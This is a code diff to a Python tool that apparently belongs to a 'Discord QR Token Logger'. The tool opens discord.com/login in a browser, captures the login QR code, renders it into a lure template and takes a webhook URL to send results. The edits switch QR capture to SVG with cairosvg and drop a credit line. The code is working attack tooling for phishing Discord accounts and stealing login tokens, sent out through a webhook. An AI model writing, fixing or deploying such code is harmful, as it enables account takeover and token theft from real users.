@@ -21,7 +21,6 @@ import requests
 from io import BytesIO
 from tempfile import NamedTemporaryFile, TemporaryDirectory
 from threading import Thread, Event
-from bs4 import BeautifulSoup
 from PIL import Image
 from pystray import Icon, Menu, MenuItem
 from pystyle import Box, Center, Colorate, Colors, System, Write
@@ -32,6 +31,7 @@ from discord_token import QRGrabber, TokenInfo
 from exceptions import InvalidToken, QRCodeNotFound, WebhookSendFailure
 from queue import Queue
 from signal import SIGTERM
+from cairosvg import svg2png
 
 
 def main(webhook_url: str) -> None:
@@ -85,10 +85,9 @@ def main(webhook_url: str) -> None:
     main.driver.implicitly_wait(5)
     main.driver.get('https://discord.com/login')
     time.sleep(5)
-    source = BeautifulSoup(main.driver.page_source, features='html.parser')
-    qrg = QRGrabber('resources')
+    qrg = QRGrabber(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'resources'))
     try:
-        qr_code = qrg.get_qr_from_source(source)
+        qr_code = qrg.get_qr_from_source(main.driver)
     except QRCodeNotFound as e:
         try:
             main.driver.service.process.send_signal(SIGTERM)
@@ -98,9 +97,7 @@ def main(webhook_url: str) -> None:
     discord_login = main.driver.current_url
     with TemporaryDirectory(dir='.') as td:
         with NamedTemporaryFile(dir=td, suffix='.png') as tp1:
-            tp1.write(
-                base64.b64decode(
-                    qr_code.replace('data:image/png;base64,','')))
+            tp1.write(svg2png(qr_code))
             Write.Print('\n[!] Generating template for QR code...', Colors.red_to_purple)
             with NamedTemporaryFile(dir=td, suffix='.png') as tp2:
                 qrg.generate_qr_for_template(tp1, tp2)
@@ -201,11 +198,11 @@ if __name__ == "__main__":
             MenuItem('Quit', window_state)
         ))
         pystray_icon.icon.run()
-    System.Title('QR DISCORD LOGIN - By Lemon.-_-.#3714, the-cult-of-integral')
+    System.Title('QR DISCORD LOGIN - By Lemon.-_-.#3714')
     System.Size(140, 35)
     print(Colorate.Horizontal(Colors.cyan_to_green, Center.XCenter(BANNER), 1))
     print(Colorate.Horizontal(Colors.rainbow, Center.GroupAlign(Box.DoubleCube(
-        "By Lemon.-_-.#3714, the-cult-of-integral")), 1))
+        "By Lemon.-_-.#3714")), 1))
     print(Colorate.Horizontal(Colors.rainbow, Box.Lines(
         "https://github.com/9P9/Discord-QR-Token-Logger").replace('ቐ', "$"), 1), "\n")
     confir = Write.Input(
